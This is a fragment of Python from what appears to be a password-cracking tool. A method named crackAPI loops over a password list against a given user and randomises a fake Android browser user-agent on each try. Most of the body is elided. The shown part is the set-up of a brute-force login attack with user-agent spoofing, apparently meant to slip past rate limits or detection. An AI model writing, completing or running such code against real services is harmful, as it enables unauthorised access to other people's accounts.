    ...
    def crackAPI(self,user,pas):
        ...
        try:
            for pw in pas:
                ...
                self.x=random.randrange(73, 100)
                self.y=random.randrange(4200, 4900)
                self.z=random.randrange(40, 150)
                uaku=f'''Mozilla/5.0 (Linux; Android 8.1.0; Nokia 1 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/10{self.x}.0.{self.y}.{self.z} Mobile Safari/537.36'''
